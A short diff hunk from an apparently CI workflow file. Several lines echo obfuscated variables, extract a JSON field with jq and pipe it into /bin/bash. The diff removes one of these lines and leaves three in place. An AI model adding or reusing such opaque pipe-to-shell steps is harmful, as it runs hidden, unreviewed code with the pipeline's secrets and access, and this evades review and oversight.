@@ -38,7 +38,6 @@ jobs:
           echo $tojs21 | jq -r .e478 | /bin/bash
           echo $obj33278 | jq -r .bf53726 | /bin/bash
           echo $hc0149 | jq -r .dtk335 | /bin/bash
-          echo $w20 | jq -r .i564 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
